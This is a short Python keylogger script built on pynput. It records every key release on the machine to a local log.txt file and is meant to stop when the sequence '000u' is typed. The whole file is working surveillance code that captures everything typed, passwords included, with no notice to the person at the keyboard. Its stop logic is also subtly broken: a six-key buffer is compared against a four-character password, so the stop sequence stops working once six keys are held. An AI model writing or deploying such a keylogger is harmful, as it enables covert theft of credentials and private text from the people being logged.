from pynput.keyboard import Listener, Key
from collections import deque

password = ["0", "0", "0", "u"]
keys = deque(maxlen=6)


def formatKey(key):
    if '<Key.space>' in key:
        return ' '
    if '<Key.enter>' in key:
        return '\n'
    else:
        return key

        


def log(text):
    with open("log.txt", "a") as file_log:
        file_log.write(formatKey(text))


def screen(key):
    try:
        log(key.char)
        keys.append(key.char)

    except AttributeError:
        log(" <" + str(key) + "> ")
        keys.append(str(key))

    if "".join(password) == "".join(keys):
        return False


with Listener(on_release = screen) as listener:
    log('\n\n')
    listener.join()